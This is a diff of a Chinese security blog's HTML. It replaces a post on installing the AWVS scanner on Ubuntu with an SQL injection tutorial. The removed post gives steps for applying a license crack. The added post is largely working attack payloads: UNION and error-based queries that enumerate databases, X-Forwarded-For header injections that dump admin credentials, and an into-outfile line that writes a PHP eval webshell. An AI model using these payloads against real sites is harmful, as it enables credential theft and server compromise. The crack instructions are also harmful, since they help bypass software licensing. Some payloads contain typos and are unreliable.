@@ -127,7 +127,7 @@
 
 
 
-  <title>ubuntu安装awvs | 简单的世界</title>
+  <title>SQL注入漏洞 | 简单的世界</title>
   
 
 
@@ -256,7 +256,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://liyusen.xyz/2019/06/09/ubuntu安装awvs/">
+    <link itemprop="mainEntityOfPage" href="http://liyusen.xyz/2019/06/29/SQL注入漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="羽洛l">
@@ -273,7 +273,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ubuntu安装awvs</h1>
+          <h1 class="post-title" itemprop="name headline">SQL注入漏洞</h1>
         
 
         <div class="post-meta">
@@ -285,7 +285,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-09T17:37:41+08:00">2019-06-09</time>
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-29T16:07:04+08:00">2019-06-29</time>
             
 
             
@@ -321,43 +321,139 @@
       
 
       
-        <h3 id="Linux中的AWVS安装"><a href="#Linux中的AWVS安装" class="headerlink" title="Linux中的AWVS安装"></a>Linux中的AWVS安装</h3><pre><code>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，
-它通过网络爬虫测试你的网站安全，检测流行安全漏洞
-</code></pre><p>对于这款工具，Windows的安装会更简单些，而Linux的安装相对来说可能会有点麻烦，但是也不会太麻烦。下面就来进行安装吧</p>
-<p>下载地址：</p>
-<p>链接：<a href="https://pan.baidu.com/s/1nm96gttIptDjLukqcfKwdg" target="_blank" rel="noopener">https://pan.baidu.com/s/1nm96gttIptDjLukqcfKwdg</a><br>提取码：528s </p>
-<p>以下都是root用户下进行的，如果不是root用户的话，需要在前面加上sudo</p>
-<pre><code>首先安装它需要安装依赖：
-apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 libx11-xcb-dev
+        <h4 id="web-安全之-SQL-注入漏洞1"><a href="#web-安全之-SQL-注入漏洞1" class="headerlink" title="web 安全之 SQL 注入漏洞1"></a>web 安全之 SQL 注入漏洞1</h4><p>SCHEMATA 表：(所有的数据库名在这个表)提供了当前 mysql 实例中所有数据库的信息。是show databases 的结果取之此表。</p>
+<p>TABLES 表：(所有的数据库的表名在这个表)提供了关于数据库中的表的信息（包括视图）。</p>
+<p>详细表述了某个表属于哪个 schema，表类型，表引擎，创建时间等信息。是 show tables from<br>schemaname 的结果取之此表。</p>
+<p>COLUMNS 表：(所有的数据库的表名中的所有列在这个表)提供了表中的列信息。</p>
+<p>详细表述了某张表的所有列以及每个列的信息。是 show columns from schemaname.tablename 的结果取之此表。</p>
+<h4 id="SQL-注入原理"><a href="#SQL-注入原理" class="headerlink" title="SQL 注入原理"></a>SQL 注入原理</h4><p>SQL 注入（Sql Injection ）是一种将 SQL 语句插入或添加到应用(用户)输入参数中的攻击，之<br>后再将这些参数传递给后台的 SQL 服务器加以解析并执行。</p>
+<p>哪里存在 SQL 注入？</p>
+<pre><code>GET , POST ,HTTP 头部注入 ，Cookie 注入，任何客户端可控、传递到服务器的变量/
+</code></pre><p>漏洞原理</p>
+<pre><code>针对 SQL 注入的攻击行为可描述为通过用户可控参数中注入 SQL 语法，破坏原有 SQL 结构，
+达到编写程序时意料之外结果的攻击行为。
+</code></pre><p>其成因可以归结以下两个原因叠加造成的：</p>
+<pre><code>1、程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造 SQL 语句
+2、未对用户可控参数进行足够的过滤便将参数内容拼接进入到 SQL 语句中。
+</code></pre><h4 id="SQL-注入危害"><a href="#SQL-注入危害" class="headerlink" title="SQL 注入危害"></a>SQL 注入危害</h4><pre><code>攻击者利用 SQL 注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中内容（脱库）。
+在特别情况下，还可以修改数据库内容
+或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺
+陷，那么攻击者可以通过 SQL 注入漏洞直接获取 webshell 或者服务器系统权限。
+</code></pre><h4 id="SQL-注入分类和利用"><a href="#SQL-注入分类和利用" class="headerlink" title="SQL 注入分类和利用"></a>SQL 注入分类和利用</h4><p>根据数据类型</p>
+<pre><code>1，整形注入
+2，字符型注入
+</code></pre><p>区别：</p>
+<pre><code>字符型：需要单引号闭合的就是字符型注入，并且需要注释掉后面的单引号(注释符号：#，-- - ,/*)
 
-依赖安装完成后，创建一个文件夹awvs,将下载的工具放进去，
-#mkdir awvs        /*创建文件夹*/
-#cd awvs        /*进入文件夹*/
-#rz                /*选择acunetinx_trial.sh*/
-</code></pre><p>我用的是xshell,rz、sz命令在Xshell传输文件</p>
-<p>rz是接收文件    </p>
-<p>sz是往Windows发送文件</p>
-<pre><code>进行安装
-chmod +x acunetix_trial.sh
-./acunetix_trial.sh
-</code></pre><p><img src="https://i.imgur.com/f4hqxN9.png" alt></p>
-<p>同意协议，yes</p>
-<p>hostname是主机名</p>
-<p>Email是你的邮箱，登入时使用</p>
-<p>password密码，登入时使用</p>
-<pre><code>安装结束后访问https://主机名：13443/
-</code></pre><p><img src="https://i.imgur.com/wgaOevD.png" alt></p>
-<p>安装破解文件</p>
-<pre><code>将刚才下载的另一个文件patch_awvs拷贝到安装目录中
-安装目录为：/home/acunetix/.acunetix_trial/v_190409112/scanner
-打开和拷贝进去
-#chmod +777 patch_awvs
-#./patch_awvs
-</code></pre><p><img src="https://i.imgur.com/uBxhVNH.png" alt></p>
-<p>检测是否成功</p>
-<p>登录系统后, 点击右上角的”Administrator-&gt;Profile-&gt;License”,可以看到99999就说明成功激活</p>
-<p>然后设置不检查更新：</p>
-<p>登录系统后,左下角Settings-&gt;ProductUpgrades,改为”Do not automaticaly check for update[Not Recommanded]”</p>
+数值型：不需要单引号闭合，也不需要注释符号
+</code></pre><p>根据注入语法</p>
+<pre><code>1， UNION query SQL injection（可联合查询注入）
+2， Stacked queries SQL injection（可多语句查询注入）
+3，Error-based SQL injection（报错型注入）
+4，Boolean-based blind SQL injection（布尔型注入）
+5，Time-based blind SQL injection（基于时间延迟注入）
+</code></pre><h3 id="SQL-注入挖掘以及防御"><a href="#SQL-注入挖掘以及防御" class="headerlink" title="SQL 注入挖掘以及防御"></a>SQL 注入挖掘以及防御</h3><pre><code>1，and 1=1 和 and 1=2 回显页面不同（整形判断）
+2，单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断）
+3，\ (转义符)
+4，-1/+1 回显下一个或上一个页面（整型判断）(需要用%2b 转码+号)
+5，and sleep(5) (判断页面返回时间)
+</code></pre><p>MYSQL 中的 3 种注释风格<br>    1,#<br>    2,– +<br>    3,/<em> …</em>/<br>    4/<em>!…</em>/ 内联注视</p>
+<p>MYSQL 中的函数利用</p>
+<p>常用函数</p>
+<pre><code>system_user() 系统用户名
+user() 数据库的用户名
+current_user() 当前用户名
+session_user() 连接数据库的用户名
+database() 数据库名
+version() MYSQL 数据库版本
+load_file(‘/etc/passwd’) MYSQL 读取本地文件的函数
+@@datadir 读取数据库的数据存储路径
+@@basedir MYSQL 的安装路径
+@@version_compile_os 后驱操作系统 Windows Server 2003
+</code></pre><p>MySQL 函数利用：</p>
+<p>load_file( )函数 读文件操作</p>
+<p>前提：</p>
+<pre><code>• 知道文件绝对路径
+• 能够使用 union 查询
+• 对 web 目录有读写权限
+</code></pre><p>into outfile( ) 写文件操作：</p>
+<p>前提：</p>
+<pre><code>• 文件名必须全路径（绝对路径），
+• 用户必须有写文件的权限
+• 没有对 ‘ 单引号过滤
+</code></pre><p>SELECT ‘&lt;?php eval($_POST[1]); ?&gt;’ into outfile ‘<br>D://phpStudy//WWW//hack.php ‘</p>
+<p>连接字符串函数</p>
+<pre><code>1,concat(str1,str2)
+2, concat_ws(separator, str1,str2...)
+3,group_concat(str1,str2......) 
+</code></pre><p>MySQL 的 concat 函数可以连接一个或者多个字符串<br>concat(str1,0x23,str2,0x23); //0x23 #<br>concat_ws()函数, 表示 concat with separator,即有分隔符的字符串连接<br>concat_ws(0x23,str1,str2,str3)<br>group_concat() 函数,把每一行数据分到一个组里显示出来</p>
+<p>MySQL 中 中 information_scheme 库</p>
+<pre><code>SCHEMATA 表 字段：SCHEMA_NAME (数据库名字)
+TABLES 表 字段：TABLE_SCHEMA， TABLE_NAME
+COLUMNS 表 字段：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME
+</code></pre><p>MySQL 中 UNION 规则</p>
+<pre><code>• UNION 必须由两条或两条以上的 SELECT 语句组成，语句之间用关键字 UNION 分隔
+• UNION 中的每个查询必须包含相同的列。
+• UNION 会从查询结果集中自动去除了重复行。
+</code></pre><p>UNION query SQl injection利用前提:</p>
+<pre><code>页面上有显示位
+
+优点:
+方便、快捷、易于利用
+缺点:
+需要显示位
+</code></pre><p>1 、判断列数<br>order by 10<br>order by 20<br>order by 15 ……</p>
+<p>2 、 判断显示位<br>php?id=-1 union select 1,2,3,4,5</p>
+<p>3 、 获取当数据库名称和当前连接数据库的用户 联合行<br>php?id=-1 union select 1,2,databaes(),4,5<br>php?id=-1 union select 1,2,user(),4,5</p>
+<p>4 、列出所有数据库<br>limit 一个一个打印出来库名<br>select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1<br>group_concat 一次性全部显示<br>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</p>
+<p>5 、列 出( 数据库：xss) 中所有的表<br>limit 一个一个打印出来字段名 schema [ˈski:mə]<br>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=’xss’ limit 0,1<br>group_concat 一次性全部显示<br>select group_concat(TABLE_NAME) from information_schema.TABLES where<br>TABLE_SCHEMA=0x674657374<br>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</p>
+<p>6 、列出（数据库：xss 表：admins ）中所有的字段<br>limit 一个一个打印出来<br>select COLIMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=’xss’ and<br>TABLENAME=’admins ‘ limit 0,1<br>group_concat 一次性全部显示<br>select group_concat(COLUMN_NAME) from information_schema.COLUMNS where<br>TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</p>
+<p>7 、列出（数据库：xss 表：admins ）中的数据<br>limit 一个一个打印出来 select username,passwd from xss.admins limit 0,1<br>group_concat 把 一次性全部打印<br>select group_concat(concat(username,0x20,passwd)) from xss.admins</p>
+<h3 id="web-安全之-SQL-注入漏洞2"><a href="#web-安全之-SQL-注入漏洞2" class="headerlink" title="web 安全之 SQL 注入漏洞2"></a>web 安全之 SQL 注入漏洞2</h3><p>Error-based SQL injection 基于错误的sql注入</p>
+<pre><code>利用前提:
+页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()
+
+优点:
+不需要显示位
+缺点:
+需要输出 mysql_error( )的报错信息
+</code></pre><p>1、通过 floor () 报错<br>floor(x),有时候也写做 Floor(x)，其功能是“向下取整”，或者说“向下舍入”，即取不大于 x 的<br>最大整数</p>
+<pre><code>select * from admins where id=1 and (select 1 from (select
+count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+</code></pre><p>获取有多少个数据库 </p>
+<pre><code>and (select 1 from(select count(*),concat((select (select (select
+concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p>通过 limit 获取所有数据库名</p>
+<pre><code>and (select 1 from(select count(*),concat((select (select (select concat(0x7e, schema_name, 0x7e)
+from information_schema.schemata limit 0,1)) from information_schema.tables limit
+0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p>2、通过 ExtractValue EXTRACTVALUE (XML_document, XPath_string);</p>
+<pre><code>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc
+第二个参数：XPath_string (Xpath 格式的字符串).
+作用：从目标 XML 中返回包含所查询值的字符串。
+
+and extractvalue(1, payload)
+and extractvalue(1, concat(0x7e,(select @@version),0x7e))
+</code></pre><p>3 、通过 UpdateXML 报错UPDATEXML (XML_document, XPath_string, new_value);</p>
+<pre><code>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1
+第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。
+第三个参数：new_value，String 格式，替换查找到的符合条件的数据
+作用：改变文档中符合条件的节点的值
++and updatexml(1,payload,1)
++and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)
+</code></pre><p>Payload:</p>
+<pre><code>x-forwarded-for:
+110.110.110.110&apos;or updatexml(1,concat(0x7e,(user())),0) or&apos;
+110.110.110.110&apos;or updatexml(1,concat(0x7e,(database())),0) or&apos;
+110.110.110.110&apos;or updatexml(1,concat(0x7e,(version())),0) or&apos;
+110.110.110.110&apos;or updatexml(1,concat(0x7e,(select+concat(table_name)
+from information_schema.tables where
+table_schema=database() limit 0,1)),0) or‘
+</code></pre><p>爆管理员 payload</p>
+<pre><code>x-forwarded-for: 110.110.110.110&apos;or
+updatexml(1,concat(0x7e,(select+concat(userName,0x23,userPwd)from admins limit 0,1)),0) or&apos;
+</code></pre><p>于19-06-28摘抄于网络信息安全实验室群</p>
 
       
     </div>
@@ -382,8 +478,8 @@ chmod +x acunetix_trial.sh
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/06/03/ubuntu安装msf/" rel="next" title="ubuntu安装msf">
-                <i class="fa fa-chevron-left"></i> ubuntu安装msf
+              <a href="/2019/06/09/ubuntu安装awvs/" rel="next" title="ubuntu安装awvs">
+                <i class="fa fa-chevron-left"></i> ubuntu安装awvs
               </a>
             
           </div>
@@ -391,10 +487,6 @@ chmod +x acunetix_trial.sh
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/06/29/SQL注入漏洞/" rel="prev" title="SQL注入漏洞">
-                SQL注入漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -510,7 +602,7 @@ chmod +x acunetix_trial.sh
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux中的AWVS安装"><span class="nav-number">1.</span> <span class="nav-text">Linux中的AWVS安装</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#web-安全之-SQL-注入漏洞1"><span class="nav-number">1.</span> <span class="nav-text">web 安全之 SQL 注入漏洞1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-注入原理"><span class="nav-number">2.</span> <span class="nav-text">SQL 注入原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-注入危害"><span class="nav-number">3.</span> <span class="nav-text">SQL 注入危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-注入分类和利用"><span class="nav-number">4.</span> <span class="nav-text">SQL 注入分类和利用</span></a></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-注入挖掘以及防御"><span class="nav-number"></span> <span class="nav-text">SQL 注入挖掘以及防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-安全之-SQL-注入漏洞2"><span class="nav-number"></span> <span class="nav-text">web 安全之 SQL 注入漏洞2</span></a></li></div>
             
 
           </div>
